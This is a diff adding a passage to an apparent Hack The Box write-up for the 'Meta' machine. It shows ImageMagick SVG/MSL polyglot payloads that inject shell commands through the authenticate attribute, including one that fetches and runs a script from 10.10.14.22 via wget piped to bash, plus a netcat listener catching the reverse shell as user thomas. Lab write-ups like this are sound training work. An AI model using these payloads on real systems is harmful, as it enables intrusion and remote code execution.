@@ -3,7 +3,7 @@ layout: writeup
 category: HTB
 date: 2024-12-29
 comments: false
-tags: subdomain abusing fileupload exiftool rce remotecodeexecution imagemagick neofetch
+tags: subdomain abusing fileupload exiftool rce remotecodeexecution imagemagick codeinjection commandexecution neofetch
 ---
 
 <br />
@@ -561,7 +561,7 @@ The `author` explains how we can `inject` commands into a `SVG MSL Polylot File`
 <br />
 
 ```SVG
-<image authenticate='ff" `echo $(id)> ./0wned`;"'>
+<image authenticate='ff" `id > /dev/shm/id.txt`;"'>
   <read filename="pdf:/etc/passwd"/>
   <get width="base-width" height="base-height" />
   <resize geometry="400x400" />
@@ -571,5 +571,78 @@ The `author` explains how we can `inject` commands into a `SVG MSL Polylot File`
   </svg>
 </image>
 ```
+
+<br />
+
+In this 0`POC`, the `"id"` command is being `injected` at the same time that the `stdout` is `stored` in a file called `"id.txt"` in the `/dev/shm` path.
+
+Let's `copy` it to the `dev` path and `check` it what happen!
+
+<br />
+
+```bash
+cp poc.svg /var/www/dev01.artcorp.htb/convert_images/
+```
+
+<br />
+
+After a few `seconds`, we check if the `file` has been `created` and if!! We have `injected` a `command` like user `thomas`!!
+
+<br />
+
+```bash
+www-data@meta:/tmp$ ls -l /dev/shm/
+total 4
+-rw-r--r-- 1 thomas thomas 54 Mar  2 12:40 id.txt
+www-data@meta:/tmp$ cat /dev/shm/id.txt 
+uid=1000(thomas) gid=1000(thomas) groups=1000(thomas)
+```
+
+<br />
+
+Now that we have the `capacity` to `execute` commands as `thomas`, we can try to get a `shell`.
+
+To do it, we are going to `use` the same `command` as in the instrusion, the `wget` one.
+
+<br />
+
+```SVG
+<image authenticate='ff" `wget -qO- http://10.10.14.22/index.html | bash`;"'>
+  <read filename="pdf:/etc/passwd"/>
+  <get width="base-width" height="base-height" />
+  <resize geometry="400x400" />
+  <write filename="test.png" />
+  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
+  <image xlink:href="msl:poc.svg" height="100" width="100"/>
+  </svg>
+</image>
+```
+
+<br />
+
+We copy again the `POC` into the `dev` directory and start a `listener` to receive the `shell`:
+
+<br />
+
+```bash
+❯ sudo nc -nlvp 443
+[sudo] contraseña para theredp4nther: 
+listening on [any] 443 ...
+connect to [10.10.14.22] from (UNKNOWN) [10.10.11.140] 44830
+bash: cannot set terminal process group (2940): Inappropriate ioctl for device
+bash: no job control in this shell
+thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ id
+id
+uid=1000(thomas) gid=1000(thomas) groups=1000(thomas)
+thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ 
+```
+
+<br />
+
+# Privilege Escalation: thomas -> root 
+
+<br />
+
+
 
 <br />
